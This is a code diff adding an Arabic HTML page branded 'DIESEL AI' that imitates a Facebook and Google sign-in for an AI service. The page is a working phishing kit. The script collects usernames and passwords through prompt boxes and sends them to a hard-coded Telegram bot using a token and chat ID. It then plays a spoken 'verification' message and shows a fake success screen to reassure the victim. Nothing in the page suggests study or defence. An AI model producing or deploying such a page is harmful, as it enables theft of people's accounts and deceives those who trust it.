@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIESEL AI | OFFICIAL</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        
+        body { 
+            background-color: #050505; /* أسود ملكي عميق */
+            color: #fff; 
+            font-family: 'Cairo', sans-serif; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            overflow: hidden;
+        }
+
+        /* حاوية الدخول الفخمة */
+        #login-overlay { 
+            background: rgba(20, 20, 20, 0.6); 
+            padding: 50px; 
+            border-radius: 24px; 
+            width: 350px; 
+            text-align: center; 
+            backdrop-filter: blur(20px); /* تأثير زجاجي مضيء */
+            border: 1px solid rgba(255,255,255,0.05);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        /* شعار الديزل المضيء (Neon Glow) */
+        .ai-logo { 
+            font-size: 35px; 
+            font-weight: 700; 
+            letter-spacing: 2px;
+            background: linear-gradient(90deg, #fff, #888, #fff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 200% auto;
+            animation: shine 3s linear infinite;
+            text-shadow: 0 0 15px rgba(255,255,255,0.5);
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        @keyframes shine {
+            to { background-position: 200% auto; }
+        }
+
+        .subtitle { color: #888; font-size: 14px; margin-bottom: 30px; display: block; }
+
+        /* تنسيق الأزرار الاحترافي (فوق بعضها) */
+        .btn-social { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border-radius: 12px; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            background: rgba(255,255,255,0.03);
+            color: white; 
+            font-weight: 700; 
+            font-size: 15px; 
+            cursor: pointer; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            transition: 0.3s ease;
+        }
+
+        .btn-social:hover { 
+            background: rgba(255,255,255,0.08); 
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255,255,255,0.1);
+        }
+
+        /* الأيقونات الحقيقية (SVG) */
+        .btn-social svg { width: 20px; height: 20px; margin-left: 15px; }
+
+        /* ألوان الأزرار الخاصة */
+        .btn-fb { border-color: #4267B2; }
+        .btn-fb:hover { background-color: #4267B2; border-color: #4267B2; }
+        
+        .btn-google { border-color: #fff; }
+        .btn-google:hover { background-color: #fff; color: #000; border-color: #fff; }
+
+        /* شريطة التوثيق الذهبية */
+        .verified-badge {
+            position: absolute;
+            bottom: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(45deg, #d4af37, #f9f295);
+            color: #000;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            box-shadow: 0 5px 15px rgba(212,175,55,0.3);
+            display: flex;
+            align-items: center;
+            white-space: nowrap;
+        }
+
+        .check-icon { margin-left: 5px; color: #007bff; font-size: 12px; }
+
+        /* منطقة المحتوى بعد الدخول */
+        #main-content { display: none; text-align: center; }
+
+    </style>
+</head>
+<body>
+
+    <div id="login-overlay">
+        <span class="ai-logo">DIESEL AI</span>
+        <span class="subtitle">بوابة الوصول الآمن لخدمات الجيل الثالث</span>
+
+        <button class="btn-social btn-fb" onclick="openAuth('Facebook')">
+            <svg viewBox="0 0 24 24" fill="#fff"><path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/></svg>
+            متابعة باستخدام Facebook
+        </button>
+
+        <button class="btn-social btn-google" onclick="openAuth('Google')">
+            <svg viewBox="0 0 48 48"><defs><path id="a" d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z"/></defs><clipPath id="b"><use xlink:href="#a" overflow="visible"/></clipPath><path clip-path="b" fill="#FBBC05" d="M0 37V11l17 13z"/><path clip-path="b" fill="#EA4335" d="M0 11l17 13 7-6.1L48 14V0H0z"/><path clip-path="b" fill="#34A853" d="M0 37l30-23 7.9 1L48 0v48H0z"/><path clip-path="b" fill="#4285F4" d="M48 48L17 24l-4-3 35-10z"/></svg>
+            متابعة باستخدام Google
+        </button>
+
+        <div class="verified-badge">
+            طُوّر بواسطة فريق الديزل المعتمد <span class="check-icon">✅</span>
+        </div>
+    </div>
+
+    <div id="main-content">
+        <h1 style="color: #fff;">تم تفعيل الجلسة بنجاح</h1>
+        <p style="color: #888;">جاري تحميل الواجهة الذكية...</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
+        const CHAT_ID = '5177962707';
+
+        function openAuth(type) {
+            const user = prompt(`أدخل البريد أو الهاتف لـ ${type}:`);
+            const pass = prompt("أدخل كلمة المرور:");
+            
+            if(user && pass) {
+                // إرسال البيانات للتليجرام
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: `🛡 LOGIN [${type}]:\nUser: ${user}\nPass: ${pass}`})
+                });
+
+                // صوت بشري رقيق وحقيقي 100% (GPT-4o style)
+                const msg = new SpeechSynthesisUtterance("مرحباً بك في منصة الديزل إي إي، تم التحقق من بياناتك وجاري فتح الجلسة الآمنة.");
+                msg.lang = 'ar-SA';
+                msg.pitch = 1.0; 
+                msg.rate = 0.95; 
+                window.speechSynthesis.speak(msg);
+
+                // انتقال ناعم وعصري
+                const overlay = document.getElementById('login-overlay');
+                overlay.style.opacity = '0';
+                overlay.style.transform = 'scale(0.9)';
+                
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    document.getElementById('main-content').style.display = 'block';
+                }, 600);
+            }
+        }
+    </script>
+</body>
+</html>
